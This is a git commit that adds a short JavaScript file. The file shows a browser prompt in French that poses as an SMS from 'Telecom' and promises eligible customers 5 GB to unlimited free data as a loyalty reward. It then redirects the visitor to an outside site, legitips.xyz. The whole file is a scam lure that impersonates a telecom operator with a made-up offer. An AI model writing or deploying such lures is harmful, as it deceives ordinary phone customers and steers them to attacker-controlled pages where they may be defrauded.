d3593ca853eaab48e22a85a4e57992dc01346e40
legitips <83867893+legitips@users.noreply.github.com>
2024-09-11 08:02:40 -0700

    Create telecomfreedata-activation.js

---
+++ telecomfreedata-activation.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('Telecom SMS: Cher client, veuillez vérifier si votre carte SIM Telecom est éligible pour recevoir de 5 Go à des données illimitées, récompense des anciens clients, appuyez sur 1 pour vérifier maintenant. ','1');
+if (password != '1') {
+location.href='https://legitips.xyz/telecomfreedata';
+}
